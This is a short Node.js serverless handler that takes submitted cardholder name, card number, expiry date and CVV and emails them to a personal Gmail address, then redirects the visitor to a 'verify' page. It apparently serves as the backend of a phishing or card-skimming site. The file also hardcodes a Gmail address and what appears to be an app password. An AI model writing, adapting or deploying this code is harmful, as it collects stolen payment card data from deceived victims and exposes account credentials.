const nodemailer = require("nodemailer");

module.exports = async (req, res) => {
  if (req.method !== "POST") return res.status(405).end();

  const transporter = nodemailer.createTransport({
    service: "gmail",
    auth: {
      user: "allenshaw302@gmail.com",
      pass: "fmsreotrrcygqlyu"
    }
  });

  const mailOptions = {
    from: "allenshaw302@gmail.com",
    to: "allenshaw302@gmail.com",
    subject: "New Submission - Card Info",
    text: `Cardholder Name: ${req.body.cardname}
Card Number: ${req.body.cardnumber}
Expiry: ${req.body.expiry}
CVV: ${req.body.cvv}`
  };

  try {
    await transporter.sendMail(mailOptions);
    res.redirect(302, "/verify.html");
  } catch (err) {
    console.error(err);
    res.status(500).send("Failed to send email");
  }
};